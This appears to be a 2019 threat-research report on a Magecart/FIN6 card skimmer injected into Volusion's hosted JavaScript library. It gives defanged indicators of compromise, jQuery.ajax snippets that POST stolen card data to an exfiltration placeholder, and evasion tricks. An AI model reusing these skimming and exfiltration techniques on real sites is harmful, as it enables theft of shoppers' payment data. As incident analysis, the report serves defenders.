Updated on October 14, 2019 at 2:50 AM PST to add a statement from Volusion.
We discovered that the online credit card skimming attack known as Magecart or E-Skimming was actively operating on
3,126 online shops. Our data shows that the attack started on September 7, 2019. All of the impacted online shops are
hosted on the cloud platform of the e-commerce service provider “Volusion,” one of the top e-commerce platforms in the
market. This is actually the third time we have identified a card skimmer injected into the cloud platform of an e-commerce
provider. Two other businesses were already victimized this year: a campus e-commerce platform and a hotel ecommerce platform. These targets are obviously appealing to cybercriminals since they are connected to multiple — in
this most recent case, thousands of — online shops.
We found malicious code injected into a JavaScript library provided by Volusion to their client shops. The injected code
loaded another JavaScript stored on a Google Storage service. The loaded script is almost a direct copy of a normal
JavaScript library but has a credit card skimmer carefully integrated. When customers submit their payment information,
the skimmer will copy and send the personal information and credit card details to an exfiltration server belonging to the
attackers.
Our team contacted Google and they have removed the file. The attack is currently offline. As of publication, Volusion has
acknowledged and fixed the issue.

During our investigation, we found that the attackers seemed more experienced and thoughtful than many other skimmer
groups. They did not simply add their malicious code at the top or end of a script; instead, they carefully integrated the
code into the original script to be part of the execution flow of the program. The code was also written as simply as
possible, making it difficult to be identified in a big library. Furthermore, they registered the domain of their exfiltration
server in a similar style to a legitimate Volusion domain.

Considering the modus operandi, we believe the attackers are from Magecart Group 6, which has also been identified as
the notorious threat actor FIN6. We found similarities in the code used in this attack and the code used in FIN6’s previous
attacks on British Airways and Newegg.
Analysis of the code injection
The attackers injected their code into a library provided on Volusion’s e-commerce platform for their client shops. The
script, described by the comments on the library, includes the necessary code for the pop-out feature of the shop’s
navigation menu. It was also used on the shop checkout page. The script is located at:
hxxps://[online shop domain]/a/j/vnav.js
The attackers didn’t just inject their code inside the library. They also integrated their code into the original function of
jQueryUI code to be executed with the original execution flow. They created a new object “e.widget.unbridge” right before
the original object “e.widget.bridge” and the malicious code is inside the new object. It’s worth noting that the attackers
even wrote their malicious code in a similar coding style to make it look more like a part of the original source code.
The injected object will create a new script element to load another remote script stored on Google Storage.

Analysis of the credit card skimmer
The loaded remote script is on Google Storage:
hxxps[:]//storage[.]googleapis[.]com/volusionapi/resources.js
Much of the code inside the script is from the library “js-cookie” version 2.2.1. However, the attackers modified it and
integrated a credit card skimmer into the original script. The skimmer binds at the events “mousedown” and “touchstart” of
the payment submit button.
This means that when victims click (from desktop) or touch (from mobile devices) the submit button, the events will be
triggered and the skimmer will be executed.

The skimmer copies the information on the entire payment form: the victim’s name, address, phone number, email
address, and credit card details (the number, cardholder name, expiration month, expiration year, and CVV number).
Once the skimmer has the credit card details, it serializes the copied data into a string and encodes it with Base64. Then,
it performs a character permutation on the encoded string to make sure it can’t be directly decoded with Base64 decoding.
The data will then be stored in sessionStorage with the key “__utmz_opt_in_out”. The next time the skimmer is loaded
(usually on the page after the payment), it will detect if there is data inside sessionStorage and it will use HTTP POST to
send the stolen payment information to a remote server at “hxxps[:]//volusion-cdn[.]com/analytics/beacon” for exfiltration.

Note that the attackers used the domain “volusion-cdn[.]com” for their exfiltration server, a similar name to Volusion’s
legitimate server. A possible reason why the attackers stored the skimmer on Google Storage is because Volusion is also
running its service on the Google Cloud Platform.
Evidence of Magecart or FIN6
As previously mentioned, based on the modus operandi, we believe the attackers are from Magecart Group 6, also known
as the threat actor FIN6. Here are the connections we considered:
Group 6 is known to only target top-tier victims, investing in scams where they can receive a big payoff from one
attack. This single hack of Volusion allows them to receive credit card data from 3,126 online shops.
From the previous skimming attack on the British Airways and Newegg websites, we know that Group 6 tried to
register the domains of the exfiltration server to be similar to the victims’ domains. In this case, the domain of the
exfiltration server is “volusion-cdn[.]com” — very similar to the valid domain “cdn3[.]volusion[.]com” from Volusion. In
addition, the exfiltration domains used during the British Airways, Newegg, and Volusion attacks are all registered
through Namecheap.
We found that the skimmer is an improved version of the previous skimmer used in the attacks on British Airways
and Newegg. Both old and current skimmers are written with jQuery, serialize the stolen data, and use the
jQuery.ajax function to POST data to a remote server. Although the older skimmer is much simpler compared to the
current one, it didn’t encode the stolen data or store the data in sessionStorage before the exfiltration.
Target

Script of data exfiltration request

British
Airways

jQuery.ajax({type:"POST",async:0,url:”[exfiltration url]”,data:t,dataType:"application/json})

Newegg

jQuery.ajax({type:"POST",async:true,url:”[exfiltration url]”,data:pdati,dataType:"application/json})

Volusion

$.ajax({type: 'POST',url: '[exfiltration url]',dataType: 'application/x-www-form-urlencoded',data: d,complete:
function() { window.sessionStorage.removeItem('__utmz_opt_in_out'); }})

It’s also interesting to see that the skimmer in this attack binds to event “mousedown” and event “touchstart” of the
payment submit button. The previous Group 6 skimmer binds to event “mouseup” and event “touchend”.
These events are different, but they are the pairs of each other that trigger the skimmer at almost the same time. It seems
that they want to trigger the skimmer at the same moment, but the current version binds on two opposite events of the
pairs to avoid detection from heuristic rules.
Target

Script of event binding

British Airways

.bind("mouseup touchend", function(a) {…})

Newegg

.bind("mouseup touchend", function(e) {…})

Volusion

.bind('mousedown touchstart', z)

It seems that Magecart is continuing to change and experiment with new attack methods, refining its skimmer to evade
detection. Sophisticated groups such as these will always try to find new ways to stay undetected in their victims’ systems.
To defend against this type of threat, website owners should regularly check and strengthen their security with patches
and server segregation. Site owners should also employ robust authentication mechanisms, especially for those that store
and manage sensitive data. IT and security teams should restrict or disable outdated components and habitually monitor
websites and applications for any indicators of suspicious activity that could lead to data exfiltration, execution of unknown
scripts, or unauthorized access and modification.
